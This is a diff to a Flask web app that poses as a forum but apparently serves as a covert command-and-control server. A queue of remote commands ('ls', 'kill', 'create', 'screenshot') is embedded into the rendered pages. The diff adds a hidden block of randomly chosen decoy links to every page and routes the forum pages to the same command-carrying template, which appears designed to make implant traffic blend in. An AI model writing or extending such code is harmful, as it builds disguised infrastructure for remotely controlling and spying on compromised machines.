@@ -1,5 +1,7 @@
 from flask import Flask, render_template, url_for, request, redirect
 from threading import Thread
+import json
+import random
 import logging
 
 
@@ -16,11 +18,17 @@ app = Flask(__name__, template_folder="static", static_folder="static")
 commands = list()
 allowed_commands = ["ls", "kill", "create", "screenshot"]
 
+configs = dict()
+with open("config/config.json", "r") as file:
+    configs = json.loads(file.read())
+
+
 def get_command():
     # Call only if there is waiting command(s) else return None
     if len(commands) == 0: return ""
     cmd = commands.pop(0)
     return cmd
+
 
 def handle_post(request):
     data = request.get_data()
@@ -33,6 +41,17 @@ def handle_post(request):
     return data
 
 
+def build_links():
+    html = '<div class="links" hidden>'
+    for url in configs.get("get_dictionary"):
+        if random.choice([True, False, True, False, True, False, True]):
+            html += f'<a href="{url}">{url.split("/")[-1].upper()}</a>'
+    url = random.choice(configs.get("get_dictionary"))
+    html += f'<a href="{url}">{url.split("/")[-1].upper()}</a>'
+    html += "</div>"
+    return html
+
+
 
 @app.route("/", methods=["GET"])
 @app.route("/home", methods=["GET"])
@@ -40,7 +59,8 @@ def home():
     return render_template("home.html", 
                         MENU=render_template("menu/menubar.html", STYLE=url_for('static', filename="styles/menubar.css")), 
                         STYLE=url_for('static', filename="styles/base.css"), 
-                        COMMANDS= render_template("base.html", COMMANDS=f'[{get_command()}]') if len(commands) > 0 else ""
+                        COMMANDS= render_template("base.html", COMMANDS=f'[{get_command()}]') if len(commands) > 0 else "",
+                        LINKS=build_links()
                         )
 
 
@@ -59,7 +79,8 @@ def login():
                                 ACTION="/login",
                                 CONTENT=render_template("form_input.html", LABEL="Pseudo", TYPE="text") 
                                         + render_template("form_input.html", LABEL="Password", TYPE="password")
-                            )
+                            ),
+                            LINKS=build_links()
                         )
 
 
@@ -78,7 +99,8 @@ def signin():
                                 CONTENT=render_template("form_input.html", LABEL="Pseudo", TYPE="text") 
                                         + render_template("form_input.html", LABEL="Password", TYPE="password")
                                         + render_template("form_input.html", LABEL="Password confirmation", TYPE="password")
-                            )
+                            ),
+                            LINKS=build_links()
                         )
 
 
@@ -89,18 +111,26 @@ def profile():
                             MENU=render_template("menu/menubar.html", STYLE=url_for('static', filename="styles/menubar.css")), 
                             STYLE=url_for('static', filename="styles/base.css"),
                             COMMANDS=render_template("base.html", COMMANDS=f'[{get_command()}]') if len(commands) > 0 else "",
-                            ADD=render_template("profile.html", )
+                            ADD=render_template("profile.html", ),
+                            LINKS=build_links()
                             )
 
 
 @app.route("/logout", methods=["GET"])
+def logout():
+    return redirect("/", code=302)
+
 
 @app.route("/forum", methods=["GET"])
-
 @app.route("/forum/post", methods=["GET", "POST"])
 @app.route("/forum/post/<post_id>", methods=["GET", "POST"])
 def test():
-    return "Hello World!"
+    return render_template("home.html", 
+                        MENU=render_template("menu/menubar.html", STYLE=url_for('static', filename="styles/menubar.css")), 
+                        STYLE=url_for('static', filename="styles/base.css"), 
+                        COMMANDS= render_template("base.html", COMMANDS=f'[{get_command()}]') if len(commands) > 0 else "",
+                        LINKS=build_links()
+                        )
 
 
 
